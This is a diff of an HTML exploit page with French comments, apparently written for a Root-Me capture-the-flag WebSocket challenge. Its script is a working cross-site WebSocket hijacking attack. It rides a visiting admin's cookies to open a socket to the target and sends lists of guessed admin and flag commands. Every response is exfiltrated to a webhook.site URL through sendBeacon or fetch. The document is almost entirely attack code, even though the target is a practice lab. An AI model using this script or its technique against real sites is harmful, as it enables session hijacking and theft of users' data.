@@ -1,29 +1,53 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Exploit WS - Root-Me</title>
+<title>Exploit WS - Root-Me (ctf03.root-me.org)</title>
 <body>
+<h3>Exploit WebSocket — Root-Me (ctf03.root-me.org)</h3>
+<p>Script automatique : envoie commandes admin si la connexion contient des cookies admin.</p>
 <script>
 (function(){
-  const WS_URL = "wss://ctf03.root-me.org/ws";
-  const EXFIL_URL = "https://webhook.site/bbc1f1ee-2d9e-4a8e-a29e-8bb7885bb805";
+  // === CONFIG - Remplace EXFIL_URL par ton webhook ===
+  const WS_URL = "ws://ctf03.root-me.org/ws";
+  const EXFIL_URL = "https://webhook.site/bbc1f1ee-2d9e-4a8e-a29e-8bb7885bb805"; // ex: "https://webhook.site/bbc1f1ee-2d9e-4a8e-a29e-8bb7885bb805"
 
+  // utilitaire simple d'exfiltration
   function exfil(data){
     try{
+      // sendBeacon est fiable pour exfil en background
       if (navigator.sendBeacon) {
         navigator.sendBeacon(EXFIL_URL + "?d=" + encodeURIComponent(data));
       } else {
         fetch(EXFIL_URL + "?d=" + encodeURIComponent(data)).catch(()=>{});
       }
-    } catch(e){}
+    } catch(e){
+      try { fetch(EXFIL_URL + "?d=" + encodeURIComponent(String(e))); } catch(_) {}
+    }
   }
 
-  const tries_json = [
-    {user:"admin", command:"getflag"},
-    {role:"admin", action:"flag"},
-    {auth:"admin", cmd:"cat /flag"},
-    {admin:true, command:"getflag"}
+  // tentatives en texte clair
+  const tries_text = [
+    "help","actions","whoIsTheBest","who is the best hacker","who is the best",
+    "secret","a secret","secrets","get secret","get secrets",
+    "admin","be admin","login admin","/admin","/secrets",
+    "flag","get flag","getFlag","getFlag()","dump","debug","list","list all"
   ];
 
+  // tentatives en JSON (objets)
+  const tries_json = [
+    {action:"help"},
+    {action:"actions"},
+    {action:"whoIsTheBest"},
+    {action:"secret"},
+    {action:"getSecret"},
+    {action:"getSecrets"},
+    {action:"admin"},
+    {action:"getFlag"},
+    {action:"flag"},
+    {action:"debug"},
+    {action:"dump"}
+  ];
+
+  // ouvre la WebSocket
   let ws;
   try {
     ws = new WebSocket(WS_URL);
@@ -34,6 +58,13 @@
 
   ws.onopen = function(){
     exfil("WS_OPENED:" + WS_URL);
+    // envoie progressivement les tests pour éviter d'être rejeté pour spam
+    for (let i=0;i<tries_text.length;i++){
+      (function(m, delay){
+        setTimeout(()=>{ try{ ws.send(m); exfil("SENT_TEXT:"+m); }catch(e){ exfil("SEND_TEXT_FAIL:"+m);} }, delay);
+      })(tries_text[i], 60*i);
+    }
+    // envoie JSON (stringifiés)
     for (let j=0;j<tries_json.length;j++){
       (function(obj, delay){
         setTimeout(()=>{ 
@@ -42,14 +73,19 @@
             ws.send(s); 
             exfil("SENT_JSON:"+s);
           } catch(e){ exfil("SEND_JSON_FAIL:"+JSON.stringify(obj)); }
-        }, 1000*j);
-      })(tries_json[j], 1000*j);
+        }, delay);
+      })(tries_json[j], 60*(tries_text.length + j));
     }
+    // envois finaux "forcés" (cas où admin doit être activé)
+    setTimeout(()=>{ try{ ws.send("admin"); ws.send("getFlag"); exfil("SENT_FINAL: admin / getFlag"); }catch(e){ exfil("SENT_FINAL_FAIL"); } }, 60*(tries_text.length + tries_json.length + 1));
   };
 
+  // Exfiltre tout ce qui arrive
   ws.onmessage = function(ev){
     try{ 
-      exfil("RECV:" + String(ev.data));
+      // envoie brut et aussi une version truncée pour lisibilité
+      exfil("RECV:" + String(ev.data).slice(0,2000));
+      console.log("WS <-", ev.data);
     } catch(e){ exfil("ONMESSAGE_ERROR"); }
   };
 
@@ -60,7 +96,8 @@
     exfil("WS_CLOSED");
   };
 
-  setTimeout(()=>{ try{ ws.close(); }catch(e){}; exfil("TIMEOUT_CLOSED"); }, 10000);
+  // Timeout: ferme après 40s et signale
+  setTimeout(()=>{ try{ ws.close(); }catch(e){}; exfil("TIMEOUT_CLOSED"); }, 40000);
 })();
 </script>
 </body>
